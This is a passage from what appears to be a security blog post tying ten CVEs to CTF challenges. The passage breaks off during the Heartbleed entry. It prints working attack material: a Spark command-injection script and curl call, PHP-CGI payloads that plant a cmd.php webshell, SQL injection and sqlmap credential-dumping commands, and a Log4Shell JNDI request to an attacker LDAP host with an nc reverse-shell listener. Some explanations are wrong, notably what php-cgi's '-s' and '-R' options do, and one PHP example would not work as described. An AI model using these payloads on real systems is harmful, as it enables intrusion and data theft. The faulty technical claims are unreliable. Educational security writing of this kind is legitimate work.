---
title: "🛠️ Top 10 Real-World Exploits That Started as CTF Challenges"
subtitle: "A breakdown of real cybersecurity incidents that originated from techniques first seen in Capture The Flag competitions."
date: 2025-06-09
cardimage: post7.jpg
featureimage:
caption: CVE
authors:
  - Havoc: logo.png
---

---


![CTF to Real World Exploits Banner](https://private-us-east-1.manuscdn.com/sessionFile/SdkOytOTyNaE1iDr18uM6Z/sandbox/qYpahNWCatCO7769ULRpf9-images_1749479365795_na1fn_L2hvbWUvdWJ1bnR1L2Jsb2dfcG9zdF9pbWFnZXMvY3RmX3JlYWxfd29ybGRfZXhwbG9pdHNfYmFubmVy.png?Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9wcml2YXRlLXVzLWVhc3QtMS5tYW51c2Nkbi5jb20vc2Vzc2lvbkZpbGUvU2RrT3l0T1R5TmFFMWlEcjE4dU02Wi9zYW5kYm94L3FZcGFoTldDYXRDTzc3NjlVTFJwZjktaW1hZ2VzXzE3NDk0NzkzNjU3OTVfbmExZm5fTDJodmJXVXZkV0oxYm5SMUwySnNiMmRmY0c5emRGOXBiV0ZuWlhNdlkzUm1YM0psWVd4ZmQyOXliR1JmWlhod2JHOXBkSE5mWW1GdWJtVnkucG5nIiwiQ29uZGl0aW9uIjp7IkRhdGVMZXNzVGhhbiI6eyJBV1M6RXBvY2hUaW1lIjoxNzY3MjI1NjAwfX19XX0_&Key-Pair-Id=K2HSFNDJXOU9YS&Signature=EjpCR5jV-nuG1usyOy3AfNJlqSIcV~~lhTPGe9zDvFfpRvfvajWf4T7iuLmfJr2vF9BKwcS40wO6K-M~C4JnzBK-BymN0yIwJplM2MxaQwHVjnsEFqSFSGoYf-PWdnPoZOzJsB3RRrlWW~~W5ERc~kUkQeUAfJN4BbtjxrUiQJZ7Z~-0EfqJsXstB-jJJ9X3pRVWIl0diiJp6oLxMVSR-5Dz3qtwWpIFbE4jABt-UQBWWeTXEiuXPPYNFAkNORzwXU6EdesSVzxxuC0N3AibHJM6o300ci-~3gRKWSsm7zWu~FVGkI4YEA67eoKuXKu1gmW48BAx71V~gGdniG375A__)

## Introduction

Capture The Flag (CTF) competitions are a cornerstone of cybersecurity education and skill development. These challenges, ranging from intricate reverse engineering puzzles to complex web exploitation scenarios, push participants to think like attackers and defenders in a controlled environment. While often seen as purely academic exercises, the techniques and vulnerabilities explored in CTFs frequently mirror, and sometimes even directly lead to, the discovery and exploitation of real-world security flaws.

This blog post delves into 10 fascinating instances where the theoretical playgrounds of CTF challenges transformed into practical, impactful real-world exploits. We'll explore the vulnerabilities, the CTF context, and the real-world implications, providing technical details, commands, and scripts where applicable.

---

## 1. **CVE-2016-5007: Spring Security/MVC Path Matching Inconsistency**


**CTF Origin:** While a direct CTF challenge leading to CVE-2016-5007 isn't explicitly documented as a public CTF challenge, the nature of this vulnerability—a path matching inconsistency leading to authorization bypass—is a classic CTF scenario. CTF challenges often involve finding subtle differences in how different components process input, leading to bypasses or unexpected behavior. This particular CVE highlights how a seemingly minor discrepancy between Spring Security and Spring Framework's URL pattern matching could be leveraged for unauthorized access.

**Vulnerability Description:** Both Spring Security and the Spring Framework rely on URL pattern mappings for authorization and for mapping requests to controllers, respectively. **CVE-2016-5007** arises from differences in the strictness of these pattern matching mechanisms. For example, variations in how spaces are trimmed in path segments can lead Spring Security to incorrectly identify certain paths as unprotected, even though they are mapped to Spring MVC controllers that should be protected. This inconsistency allows an attacker to bypass security controls and access restricted resources.

**Real-World Impact:** An attacker could craft a specially malformed URL to bypass authentication or authorization checks, gaining access to sensitive information or functionality that should be restricted. This could lead to data breaches, unauthorized administrative actions, or other severe security compromises depending on the application's design.

**Technical Details and Exploitation (Conceptual):**

Consider a Spring application with a protected endpoint, `/admin/dashboard`, accessible only to authenticated administrators. Due to the path matching inconsistency, an attacker might be able to access this resource via a URL like `/admin;/dashboard` or `/admin%20/dashboard` if the security filter processes the path differently than the controller mapping.

While a universal exploit script is difficult to provide without a specific vulnerable application, the general approach involves:

1.  **Identifying a protected resource:** Locate an endpoint that requires authentication or specific roles.
2.  **Fuzzing URL paths:** Experiment with various URL encoding techniques, path separators, and whitespace characters to find discrepancies in how the security layer and the application layer interpret the URL.
3.  **Bypassing authorization:** If a discrepancy is found, the attacker can craft a URL that the security layer deems permissible but the application layer correctly routes to the protected resource.

**Example (Conceptual) Request:**

```http
GET /admin;/dashboard HTTP/1.1
Host: vulnerable-app.com
User-Agent: Mozilla/5.0
```

In this conceptual example, if the Spring Security filter interprets `/admin;/dashboard` as `/admin` (and thus not protected), but the Spring MVC controller correctly maps `/admin;/dashboard` to the `/admin/dashboard` handler, an authorization bypass occurs.

**Mitigation:** The primary mitigation for CVE-2016-5007 involves updating Spring Framework and Spring Security to versions that address this path matching inconsistency. Developers should also ensure consistent URL processing across all layers of their application and implement robust input validation.

---



## 2. **CVE-2022-33891: Apache Spark Shell Command Injection**

**CTF Origin:** This vulnerability gained significant attention in the CTF community, notably being recreated as the "Sparky" challenge in Snyk's Fetch the Flag CTF. This demonstrates how real-world vulnerabilities are often distilled into CTF challenges to educate and train cybersecurity professionals in identifying and exploiting such flaws in a controlled environment.

**Vulnerability Description:** CVE-2022-33891 is a critical shell command injection vulnerability affecting Apache Spark UI. The flaw exists due to improper handling of user-controlled input when Access Control Lists (ACLs) are enabled via the `spark.acls.enable` configuration option. Specifically, when an authentication filter is used to check user permissions, Spark attempts to verify group membership by executing a raw Linux command. An attacker can inject arbitrary shell commands into the `?doAs` parameter, leading to remote code execution (RCE).

**Real-World Impact:** Successful exploitation of this vulnerability allows an unauthenticated, remote attacker to execute arbitrary commands on the underlying operating system with the privileges of the Spark process. This can lead to complete system compromise, data exfiltration, deployment of malware, or disruption of Spark services. Given Spark's widespread use in big data processing, the impact of this RCE can be severe, affecting critical business operations and sensitive data.

**Technical Details and Exploitation:**

The vulnerability lies in the `doAs` parameter within the Spark UI. When ACLs are enabled, Spark constructs a shell command to check user group membership. If the `doAs` parameter is not properly sanitized, an attacker can inject malicious commands.

**Exploitation Steps (Conceptual):**

1.  **Identify a vulnerable Spark UI:** Look for publicly accessible Spark UIs with ACLs enabled.
2.  **Craft a malicious `doAs` parameter:** Inject shell commands into the `doAs` parameter in the URL.

**Example Exploit (Python using `requests` library):**

```python
import requests

TARGET_URL = "http://<spark_ui_host>:8080/"
# Example: Execute 'id' command and redirect output to a web-accessible location
# In a real scenario, you'd want to make the output accessible to your attacker machine
# For demonstration, we'll assume a simple command execution that might leave traces
COMMAND = "id > /tmp/output.txt"

# The payload leverages command injection via the 'doAs' parameter
# The '`' (backtick) characters are used for command substitution in shell
PAYLOAD = f"/?doAs=`{COMMAND}`"

FULL_URL = TARGET_URL + PAYLOAD

try:
    print(f"Attempting to exploit: {FULL_URL}")
    response = requests.get(FULL_URL, timeout=5)
    print(f"Response Status Code: {response.status_code}")
    # In a real exploit, you'd check for command execution success
    # For example, by trying to retrieve the /tmp/output.txt file
    print("Exploit sent. Check the target system for command execution.")
except requests.exceptions.RequestException as e:
    print(f"Error during request: {e}")

# To verify (conceptual, requires web server on target or other exfiltration):
# requests.get("http://<spark_ui_host>:8080/static/tmp/output.txt")
```

**Command Line Example (using `curl`):**

```bash
# Replace <spark_ui_host> with the actual host and 8080 with the Spark UI port
# This command executes 'whoami' and appends it to /tmp/whoami.txt on the target
curl "http://<spark_ui_host>:8080/?doAs=\`whoami%20%3E%3E%20/tmp/whoami.txt\`"

# To verify (requires access to the target system or another exfiltration method):
# ssh user@<spark_ui_host> "cat /tmp/whoami.txt"
```

**Mitigation:** The most effective mitigation is to upgrade Apache Spark to a patched version (2.x and 3.x series are affected, refer to official Apache Spark security advisories for specific patched versions). Additionally, ensure that the Spark UI is not exposed to untrusted networks. Implement strong authentication and authorization mechanisms, and regularly audit configurations for security best practices. Input validation on all user-supplied parameters is crucial to prevent command injection and similar vulnerabilities.

---



## 3. **CVE-2020-6512: Google Chrome V8 Type Confusion**

**CTF Origin:** While not directly tied to a specific public CTF challenge that led to its discovery, type confusion vulnerabilities are a common theme in CTF binary exploitation and browser exploitation challenges. These challenges often require participants to understand low-level memory manipulation and how different data types are handled by a program, mirroring the complexities of exploiting vulnerabilities like CVE-2020-6512.

**Vulnerability Description:** CVE-2020-6512 is a type confusion vulnerability in the V8 JavaScript engine, used by Google Chrome. Type confusion occurs when a program accesses a resource (e.g., an object or a variable) with a type that is incompatible with the type originally intended by the programmer. This mismatch can lead to unexpected behavior, memory corruption (like heap corruption), and ultimately, arbitrary code execution.

In the case of CVE-2020-6512, a remote attacker could potentially exploit heap corruption via a crafted HTML page. This means that by simply visiting a malicious website, a user could trigger the vulnerability.

**Real-World Impact:** Exploiting a browser-based type confusion vulnerability like this can have severe consequences. A successful exploit could allow an attacker to execute arbitrary code in the context of the browser, potentially leading to: 

*   **System Compromise:** Gaining control over the user's computer.
*   **Data Theft:** Stealing sensitive information, such as credentials, personal data, or financial details.
*   **Malware Deployment:** Installing malicious software on the victim's machine.
*   **Browser Session Hijacking:** Taking over the user's browsing session.

**Technical Details and Exploitation (Conceptual):**

Exploiting type confusion vulnerabilities in complex environments like a JavaScript engine is highly sophisticated and typically involves chaining multiple vulnerabilities. The general idea is to manipulate the program's state so that an object is treated as a different type, allowing an attacker to read or write to arbitrary memory locations. This memory primitive can then be used to achieve arbitrary code execution.

While providing a simple, runnable exploit script for a V8 type confusion vulnerability is beyond the scope of a blog post due to its complexity and the rapid patching of such flaws, the conceptual steps often involve:

1.  **Triggering the Type Confusion:** Crafting JavaScript code that causes the V8 engine to misinterpret the type of an object.
2.  **Achieving a Memory Primitive:** Using the type confusion to gain capabilities like arbitrary read/write to memory. This might involve creating a fake object with controlled properties that the engine then misinterprets.
3.  **Bypassing Protections:** Overcoming modern exploit mitigations like ASLR (Address Space Layout Randomization) and DEP (Data Execution Prevention) by leaking addresses and controlling execution flow.
4.  **Achieving Remote Code Execution:** Executing shellcode or other malicious payloads.

**Example (Conceptual) JavaScript Snippet (Illustrative, NOT a working exploit):**

```javascript
// This is a highly simplified and conceptual example.
// Real-world V8 exploits are far more complex and involve deep understanding of the engine's internals.

function triggerTypeConfusion(obj) {
    // Imagine a scenario where 'obj' is initially treated as one type,
    // but due to some optimization or specific sequence of operations,
    // the engine later treats it as another, incompatible type.
    // This could lead to misinterpretation of its internal structure.
    return obj.someProperty; // Accessing a property that might be interpreted differently
}

let arr = [1.1, 2.2, 3.3]; // An array of floats
let obj = { x: 10, y: 20 }; // A simple object

// In a real exploit, the type confusion would be triggered by a subtle interaction
// that causes the engine to confuse 'arr' with 'obj' or vice-versa, or a specially
// crafted object that can be reinterpreted.

// For instance, if 'arr' could be confused with 'obj', accessing 'arr[0]' might
// be interpreted as accessing 'obj.x' or some other memory location.

// This is where the magic (and complexity) of V8 exploitation lies.
// The goal is to turn a type confusion into a reliable memory read/write primitive.
```

**Mitigation:** The most crucial mitigation for browser vulnerabilities like CVE-2020-6512 is to keep your web browser updated to the latest version. Browser vendors regularly release security patches to address newly discovered vulnerabilities. Additionally, practicing good browsing habits, such as avoiding suspicious websites and being cautious about clicking on unknown links, can reduce the risk of exploitation.

---



## 4. **CVE-2012-1823: PHP CGI Remote Code Execution**

**CTF Origin:** CVE-2012-1823, often referred to as the "PHP CGI vulnerability" or "CGI bug," has been a staple in many CTF challenges, particularly in the web exploitation category. Its simplicity and effectiveness in achieving remote code execution make it an excellent learning tool for understanding how misconfigurations and improper input handling can lead to severe vulnerabilities. CTF players frequently encounter scenarios where they need to exploit this exact flaw to gain initial access to a web server.

**Vulnerability Description:** This vulnerability affects PHP versions prior to 5.3.13 and 5.4.2 when configured as a CGI script (php-cgi). The core of the issue lies in how php-cgi handles query strings that do not contain an `=` (equals sign) character. Instead of treating such a query string as `$_GET` parameters, php-cgi incorrectly parses it as command-line arguments to the PHP interpreter. This allows an attacker to inject arbitrary arguments into the PHP interpreter, including the `-d` option, which can be used to set PHP configuration directives. By setting `auto_prepend_file` or `auto_append_file` to a file containing PHP code, an attacker can achieve remote code execution.

**Real-World Impact:** A successful exploitation of CVE-2012-1823 grants an attacker arbitrary code execution on the web server. This means the attacker can:

*   **Execute System Commands:** Run any command on the server, potentially leading to full system compromise.
*   **Read/Write Files:** Access, modify, or delete any files accessible to the web server process.
*   **Install Backdoors:** Establish persistent access to the compromised server.
*   **Deface Websites:** Alter website content.
*   **Pivot to Internal Networks:** Use the compromised server as a stepping stone to attack other systems within the network.

**Technical Details and Exploitation:**

The exploitation of CVE-2012-1823 is relatively straightforward. The attacker appends a specially crafted query string to the URL of a PHP file that is being executed via CGI.

**Example Exploit (using `curl`):**

Let's assume a vulnerable PHP file `info.php` exists on the server.

```bash
# Example 1: Executing a simple command (e.g., `id`)
# The -s option is used to set a PHP configuration directive.
# The -R option is used to specify the request method.
# The -d allow_url_include=On -d auto_prepend_file=php://input part allows injecting PHP code directly.
curl -s -X GET "http://<target_ip>/info.php?-s" -d "<?php system(\'id\'); ?>"

# Example 2: Creating a simple backdoor (e.g., `cmd.php`)
# This creates a file named cmd.php that can execute commands via a GET parameter.
curl -s -X GET "http://<target_ip>/info.php?-d+allow_url_include%3dOn+-d+auto_prepend_file%3dphp%3a%2f%2finput" -d "<?php file_put_contents(\'cmd.php\', \'<?php system($_GET[\\'cmd\\']); ?>\'); ?>"

# After creating the backdoor, you can execute commands like this:
# curl "http://<target_ip>/cmd.php?cmd=ls%20-la"
```

**Explanation of the payload:**

*   `?-s`: This tells the PHP CGI interpreter to parse the subsequent data as if it were from `php://stdin`. When combined with `php://input`, it allows direct code injection.
*   `-d allow_url_include=On`: This sets the `allow_url_include` PHP directive to `On`, which is necessary for `php://input` to be treated as an includeable file.
*   `-d auto_prepend_file=php://input`: This directive tells PHP to parse the content of `php://input` (which is the POST data in our `curl` request) before executing the main PHP script. This is where our malicious PHP code is injected.
*   `<?php system(\'id\'); ?>`: This is the malicious PHP code that executes the `id` command on the server.
*   `file_put_contents(\'cmd.php\', \'<?php system($_GET[\\'cmd\\']); ?>\')`: This PHP code creates a new file `cmd.php` with content that allows arbitrary command execution via the `cmd` GET parameter.

**Mitigation:** The most effective mitigation is to upgrade PHP to a patched version (5.3.13 or later, or 5.4.2 or later). If upgrading is not immediately possible, ensure that PHP is not configured to run as a CGI script. Instead, use FPM (FastCGI Process Manager) or mod_php (for Apache) for a more secure execution environment. Additionally, implement robust input validation and web application firewalls (WAFs) to detect and block malicious requests.

---



## 5. **CVE-2019-20372: NGINX HTTP Request Smuggling**

**CTF Origin:** HTTP Request Smuggling is a sophisticated attack technique that frequently appears in advanced web exploitation CTF challenges. These challenges often test a player's understanding of HTTP protocol nuances, how different web servers and proxies interpret requests, and how to craft ambiguous requests to bypass security controls. The mention of CVE-2019-20372 in the NYU CTF Bench highlights its relevance as a real-world vulnerability that can be simulated and explored in a CTF context.

**Vulnerability Description:** CVE-2019-20372 is an HTTP Request Smuggling vulnerability affecting NGINX versions before 1.17.7, specifically when certain `error_page` configurations are used. HTTP Request Smuggling occurs when an attacker sends an ambiguous HTTP request that is interpreted differently by an intermediary proxy (or load balancer) and the backend web server. This discrepancy can allow an attacker to "smuggle" a second, malicious request within the first, leading to various attacks.

In this particular NGINX vulnerability, the `error_page` directive, if misconfigured, could lead to a situation where NGINX processes a request differently than a front-end proxy, allowing for request smuggling. This could enable an attacker to read unauthorized memory, potentially leading to information disclosure.

**Real-World Impact:** HTTP Request Smuggling attacks can have a wide range of severe consequences, including:

*   **Bypassing Security Controls:** Circumventing WAFs, authentication mechanisms, and access controls.
*   **Accessing Internal Resources:** Reaching internal APIs or services that are not meant to be publicly exposed.
*   **Cache Poisoning:** Injecting malicious content into web caches, which is then served to legitimate users.
*   **Cross-Site Scripting (XSS):** Delivering XSS payloads to other users.
*   **Information Disclosure:** As indicated by this CVE, an attacker might be able to read unauthorized memory, potentially revealing sensitive data.

**Technical Details and Exploitation (Conceptual):**

HTTP Request Smuggling relies on inconsistencies in how `Content-Length` and `Transfer-Encoding` headers are processed. The general idea is to make one server (e.g., a proxy) believe the request ends at one point, while another server (e.g., NGINX) believes it ends at another, allowing the attacker to append a hidden request.

For CVE-2019-20372, the specific trigger involves the `error_page` directive. If NGINX encounters an error and redirects to a custom error page, and the original request was crafted in a way that exploits the parsing discrepancy, the smuggled request could be processed.

**Example (Conceptual) HTTP Request (Illustrative, NOT a working exploit):**

```http
POST /some/path HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0\r\n
GET /admin HTTP/1.1
Host: example.com
Content-Length: 10

SMUGGLED
```

In this conceptual example:

*   A front-end proxy might process `Content-Length: 6`, seeing only the `0\r\n` chunk.
*   NGINX, due to the vulnerability and `error_page` configuration, might process `Transfer-Encoding: chunked` and then interpret the `GET /admin HTTP/1.1` as a new, smuggled request.

This could lead to NGINX attempting to access `/admin` without proper authorization checks, potentially revealing sensitive information or allowing further attacks.

**Mitigation:** The primary mitigation for CVE-2019-20372 is to upgrade NGINX to version 1.17.7 or later. Additionally, it is crucial to:

*   **Ensure Consistent HTTP Parsing:** Configure all web servers, proxies, and load balancers to use consistent HTTP parsing rules.
*   **Avoid Ambiguous Requests:** Reject any requests that contain both `Content-Length` and `Transfer-Encoding` headers, or prioritize one over the other in a consistent manner.
*   **Implement Robust WAFs:** Use Web Application Firewalls to detect and block request smuggling attempts.
*   **Regularly Audit Configurations:** Review NGINX and proxy configurations, especially `error_page` directives, to ensure they do not introduce vulnerabilities.

---



## 6. **CVE-2019-2684: Java Zero-Day Exploited in CTF**

**CTF Origin:** This CVE stands out as a direct example of a real-world vulnerability discovered and exploited during a CTF competition. As mentioned in a Hacker News comment, participants in a CTF managed to exploit two Java zero-days, which they subsequently reported to Oracle, leading to the assignment of CVE-2019-2684. This highlights the invaluable role CTFs can play not just in skill development, but also in actual vulnerability research and responsible disclosure.

**Vulnerability Description:** CVE-2019-2684 is a difficult-to-exploit vulnerability in Java SE and Java SE Embedded. While the specifics of the zero-day exploited in the CTF context are not fully public due to its sensitive nature and the rapid patching by Oracle, the general category of such vulnerabilities often involves issues in Java's remote method invocation (RMI) or deserialization mechanisms. These flaws can allow an unauthenticated attacker with network access to compromise Java SE, leading to unauthorized creation, deletion, or modification of critical data, or even full system compromise.

**Real-World Impact:** Exploiting a Java zero-day can have far-reaching consequences, especially given Java's pervasive use in enterprise applications, web servers (like Apache Tomcat, which was also affected by related issues), and various other systems. A successful exploit could lead to:

*   **Data Integrity Compromise:** Unauthorized alteration or destruction of sensitive data.
*   **Data Confidentiality Breach:** Access to confidential information.
*   **System Takeover:** Remote code execution, allowing the attacker to gain full control over the affected Java application and potentially the underlying system.
*   **Service Disruption:** Denial of service or other operational impacts.

**Technical Details and Exploitation (Conceptual):**

Exploiting complex Java vulnerabilities, especially zero-days, typically involves a deep understanding of Java internals, bytecode manipulation, and network protocols. While the exact exploit chain for CVE-2019-2684 is not publicly detailed, vulnerabilities in Java RMI often involve:

1.  **Deserialization Issues:** Maliciously crafted serialized objects sent over RMI can be deserialized by the target, leading to arbitrary code execution if proper validation is not in place.
2.  **Method Invocation Bypass:** Abusing legitimate RMI methods to trigger unintended actions or bypass security checks.

**Example (Conceptual) Attack Flow:**

An attacker might leverage a vulnerable RMI endpoint. If the application is susceptible to deserialization attacks, the attacker could send a specially crafted serialized Java object that, when deserialized by the vulnerable server, executes arbitrary commands. This often involves using existing gadgets (classes with exploitable methods) within the Java classpath.

```java
// Conceptual (NOT a working exploit, for illustrative purposes only)
// This represents the idea of sending a malicious serialized object
// to a vulnerable RMI endpoint.

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class ConceptualRMIAttack {
    public static void main(String[] args) {
        try {
            String host = "<vulnerable_rmi_host>";
            int port = 1099; // Default RMI registry port
            String serviceName = "VulnerableService";

            // Imagine a gadget chain that, when deserialized, executes a command
            // This would typically involve a library like ysoserial to generate the payload
            byte[] maliciousPayload = generateMaliciousSerializedObject(); // Placeholder function

            Registry registry = LocateRegistry.getRegistry(host, port);
            // Attempt to bind or rebind a malicious object, or invoke a method
            // that triggers deserialization of the malicious payload.
            // The exact method depends on the specific vulnerability.
            // registry.bind(serviceName, new MaliciousObject(maliciousPayload));

            System.out.println("Conceptual RMI attack initiated. Check target for impact.");

        } catch (Exception e) {
            System.err.println("Client exception: " + e.toString());
            e.printStackTrace();
        }
    }

    // Placeholder for generating a malicious serialized object
    private static byte[] generateMaliciousSerializedObject() throws Exception {
        // In a real scenario, this would involve using tools like ysoserial
        // to create a payload that triggers command execution upon deserialization.
        // For example, a CommonsCollections or GadgetChain payload.
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        // oos.writeObject(new SomeGadgetChainObject("command_to_execute"));
        oos.close();
        return bos.toByteArray();
    }
}
```

**Mitigation:** The most critical mitigation for CVE-2019-2684 and similar Java vulnerabilities is to keep Java Development Kit (JDK) and Java Runtime Environment (JRE) installations updated to the latest patched versions. Oracle regularly releases Critical Patch Updates (CPUs) that address such security flaws. Additionally, it is essential to:

*   **Principle of Least Privilege:** Run Java applications with the minimum necessary privileges.
*   **Input Validation:** Implement strict input validation for all data received from untrusted sources, especially when dealing with serialization/deserialization.
*   **Network Segmentation:** Restrict network access to RMI ports and other sensitive services.
*   **Security Scanners:** Regularly scan Java applications for known vulnerabilities and misconfigurations.

---



## 7. **CVE-2019-9053: CMS Made Simple SQL Injection**

**CTF Origin:** CVE-2019-9053, an unauthenticated blind time-based SQL injection in CMS Made Simple, has been a popular target in various CTF challenges, including those on platforms like TryHackMe. SQL injection is a fundamental web exploitation technique, and CTFs often feature scenarios where players must identify and exploit such vulnerabilities to extract sensitive information (like admin credentials) from a database. This CVE serves as an excellent real-world example of how these CTF skills translate directly to practical attacks.

**Vulnerability Description:** This vulnerability affects CMS Made Simple (CMSMS) versions up to 2.2.9. Specifically, it resides in the News module and allows an unauthenticated attacker to perform a blind time-based SQL injection through a crafted URL. Blind SQL injection means that the attacker does not receive direct feedback from the database about the results of their query. Instead, they infer information by observing the time it takes for the server to respond, based on conditional statements in their injected SQL.

**Real-World Impact:** A successful exploitation of CVE-2019-9053 can lead to:

*   **Sensitive Data Disclosure:** Extraction of all data from the database, including user credentials (usernames and password hashes), configuration details, and other confidential information.
*   **Authentication Bypass:** If admin credentials are leaked, an attacker can gain full administrative control over the CMSMS instance.
*   **Website Defacement:** With administrative access, an attacker can modify website content.
*   **Further Exploitation:** The compromised CMSMS instance can be used as a pivot point for further attacks on the hosting server or other connected systems.

**Technical Details and Exploitation:**

The exploitation of this vulnerability involves sending crafted HTTP GET requests to the News module, specifically targeting the `m1_id` parameter. The attacker uses SQL `IF` statements combined with `SLEEP()` or `BENCHMARK()` functions to introduce time delays based on the truthiness of a condition. By observing these delays, the attacker can extract information character by character.

**Example Exploit (Conceptual `curl` for extracting database name length):**

Let's assume the vulnerable URL is `http://<target_cmsms_site>/news/`.

```bash
# Check if the length of the database name is 10
# If true, the response will be delayed by 5 seconds.
curl -s -o /dev/null -w "%{time_total}\n" \
"http://<target_cmsms_site>/news/index.php?m1_id=1%27%20AND%20(SELECT%20IF(LENGTH(DATABASE())%3D10%2CSLEEP(5)%2C0))%20--%20a"

# Explanation of the payload:
# m1_id=1%27: Starts the SQL injection with a single quote to break out of the original query.
# AND (SELECT IF(LENGTH(DATABASE())=10,SLEEP(5),0)): This is the core of the blind time-based SQLi.
#   - LENGTH(DATABASE())=10: Checks if the length of the current database name is 10.
#   - IF(condition, true_value, false_value): If the condition is true, it executes SLEEP(5) (pauses for 5 seconds); otherwise, it does nothing.
# -- a: Comments out the rest of the original SQL query.
# %20: URL-encoded space.
# %3D: URL-encoded equals sign.
# %2C: URL-encoded comma.
# %27: URL-encoded single quote.
```

To automate the extraction of the full database name, table names, column names, and ultimately, user credentials, attackers typically use specialized tools like `sqlmap`. `sqlmap` can automate the entire process of detecting and exploiting SQL injection vulnerabilities, including blind time-based ones.

**Example `sqlmap` command (conceptual):**

```bash
# Basic command to test for SQL injection and dump database names
sqlmap -u "http://<target_cmsms_site>/news/index.php?m1_id=1" --dbms=mysql --technique=T --batch --dbs

# To dump users and password hashes (assuming you found the database and table names)
# sqlmap -u "http://<target_cmsms_site>/news/index.php?m1_id=1" -D <database_name> -T <users_table> --dump --batch
```

**Mitigation:** To protect against CVE-2019-9053 and other SQL injection vulnerabilities:

*   **Upgrade CMS Made Simple:** Update CMS Made Simple to a patched version (2.2.10 or later).
*   **Parameterized Queries/Prepared Statements:** Always use parameterized queries or prepared statements when interacting with databases. This ensures that user input is treated as data, not as executable code, preventing SQL injection.
*   **Input Validation:** Implement strict input validation on all user-supplied data, especially in URL parameters, form fields, and headers.
*   **Principle of Least Privilege:** Configure database users with the minimum necessary privileges.
*   **Web Application Firewall (WAF):** Deploy a WAF to detect and block SQL injection attempts.
*   **Error Handling:** Avoid displaying verbose database error messages to users, as these can provide valuable information to attackers.

---



## 8. **CVE-2021-44228: Apache Log4j Remote Code Execution (Log4Shell)**

**CTF Origin:** The Log4j vulnerability, famously known as Log4Shell, became a global cybersecurity crisis in late 2021. Due to its widespread impact and ease of exploitation, it quickly became a prime candidate for CTF challenges. Numerous CTFs, including those on platforms like TryHackMe and Google CTF, recreated the Log4Shell vulnerability to allow participants to understand, exploit, and mitigate this critical flaw in a safe environment. This rapid integration into CTFs demonstrates how quickly the cybersecurity community adapts real-world threats into educational tools.

**Vulnerability Description:** CVE-2021-44228 is a critical remote code execution (RCE) vulnerability in Apache Log4j 2, a popular Java logging library. The vulnerability arises from the library's support for JNDI (Java Naming and Directory Interface) lookups in configuration, log messages, and parameters. An attacker can craft a malicious string containing a JNDI lookup (e.g., `${jndi:ldap://attacker.com/a}`) that, when logged by a vulnerable Log4j instance, causes the server to connect to an attacker-controlled LDAP server. This LDAP server can then return a malicious Java class, which the vulnerable Log4j instance downloads and executes, leading to RCE.

**Real-World Impact:** Log4Shell had an unprecedented impact due to Log4j's ubiquitous presence in enterprise applications, cloud services, and various software products. Successful exploitation allowed unauthenticated, remote attackers to:

*   **Achieve Full System Compromise:** Execute arbitrary code with the privileges of the vulnerable application, leading to complete control over the affected system.
*   **Data Exfiltration:** Steal sensitive data from compromised systems.
*   **Ransomware Deployment:** Deploy ransomware or other malicious payloads.
*   **Supply Chain Attacks:** Compromise software supply chains by injecting malicious code into widely used applications.

**Technical Details and Exploitation:**

The exploitation of Log4Shell is remarkably simple, often requiring only a single HTTP request containing the malicious JNDI string. The attacker needs to set up a malicious LDAP server (or RMI, DNS, etc.) that serves the malicious Java class.

**Example Exploit (Conceptual `curl` request and `nc` listener):**

1.  **Attacker sets up a malicious LDAP server and a web server:** Tools like `marshalsec` or `JNDI-Exploit-Kit` can be used to set up the LDAP server that serves the malicious Java payload.
2.  **Attacker crafts a malicious request:** The attacker sends a request to the vulnerable application containing the JNDI lookup string in a field that is logged by Log4j (e.g., User-Agent header, URL path, or a form parameter).

```bash
# Attacker's machine: Start a Netcat listener to catch reverse shell (optional, but common for RCE verification)
nc -lvnp 9001

# Attacker's machine: Example of a malicious JNDI string in a User-Agent header
# Replace <attacker_ip> and <ldap_port> with your actual IP and port
# The payload points to an attacker-controlled LDAP server that will serve a malicious Java class
curl -H "User-Agent: ${jndi:ldap://<attacker_ip>:<ldap_port>/a}" http://<vulnerable_target_ip>:<port>/some_endpoint

# Example of a malicious JNDI string in a URL parameter
# curl "http://<vulnerable_target_ip>:<port>/?q=${jndi:ldap://<attacker_ip>:<ldap_port>/a}"
```

When the vulnerable application logs the User-Agent header (or the URL parameter), the Log4j library attempts to resolve the JNDI lookup. This triggers a connection to the attacker's LDAP server, which then redirects the vulnerable server to download and execute a malicious Java class from the attacker's web server. This malicious class can then execute arbitrary commands, such as spawning a reverse shell back to the attacker's Netcat listener.

**Mitigation:** Immediate and comprehensive mitigation for Log4Shell involves:

*   **Upgrade Log4j:** Upgrade Apache Log4j 2 to version 2.17.1 or later (or 2.12.4 for Java 7) to address the vulnerability. This is the most effective solution.
*   **Remove JndiLookup class:** For older versions, remove the `JndiLookup` class from the classpath (e.g., `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`).
*   **Set `log4j2.formatMsgNoLookups=true`:** For Log4j 2.10 to 2.14.1, set the system property `log4j2.formatMsgNoLookups` to `true` or set the environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS` to `true`.
*   **Network Segmentation and WAFs:** Implement strict network segmentation to limit outbound connections from vulnerable applications and deploy Web Application Firewalls (WAFs) to detect and block malicious JNDI strings.
*   **Regular Patching:** Maintain a rigorous patching schedule for all software components.

---



## 9. **CVE-2014-0160: OpenSSL Heartbleed**

**CTF Origin:** The Heartbleed bug (CVE-2014-0160) was a catastrophic vulnerability discovered in OpenSSL in 2014. Given its widespread impact and the relative ease of exploitation, it quickly became a classic scenario in CTF competitions. Many CTFs, including Plaid CTF 2014, featured challenges based on Heartbleed, requiring participants to exploit the vulnerability to extract sensitive information, such as private keys or session data, from a vulnerable server. This allowed players to understand the mechanics and implications of this critical flaw.

**Vulnerability Description:** Heartbleed is a serious vulnerability in the OpenSSL cryptographic software library, specifically in its implementation of the TLS/DTLS heartbeat extension (RFC 6520). The heartbeat extension is designed to keep a secure communication link alive without renegotiating the connection. The vulnerability occurs because the affected versions of OpenSSL do not properly validate the length of a heartbeat request. An attacker can send a specially crafted heartbeat request with a small payload but claim a larger payload length. The vulnerable server then reads out-of-bounds memory from its own process and sends it back to the attacker, leaking up to 64 kilobytes of memory per heartbeat.

